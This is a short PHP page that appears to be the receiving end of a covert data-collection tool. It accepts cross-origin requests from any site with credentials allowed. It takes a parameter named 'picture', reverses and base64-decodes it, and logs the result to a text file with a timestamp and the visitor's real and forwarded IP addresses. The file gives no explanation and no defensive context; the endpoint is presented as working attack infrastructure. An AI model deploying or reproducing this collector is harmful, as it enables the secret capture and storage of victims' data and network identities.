<html>

<?php
header('Access-Control-Allow-Methods: GET, REQUEST, OPTIONS');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type, *');

$file = 'data.txt';
if(isset($_REQUEST['picture']) && !empty($_REQUEST['picture']))
{
	if ($_SERVER['HTTP_X_FORWARDED_FOR'] == "")
	{
		$forwarded_ip = "NO-PROXY-DETECTED";
	}
	else
	{
		$forwarded_ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}

	file_put_contents($file, gmdate("Y-m-d H:i:s") . " {|} " . $_SERVER['REMOTE_ADDR'] . " {|} " . $forwarded_ip . " {|} " . base64_decode(strrev($_REQUEST['picture'])) . "\n", FILE_APPEND);
}
?>

<img alt="" src="data:image/jpg;base64," />
</html>
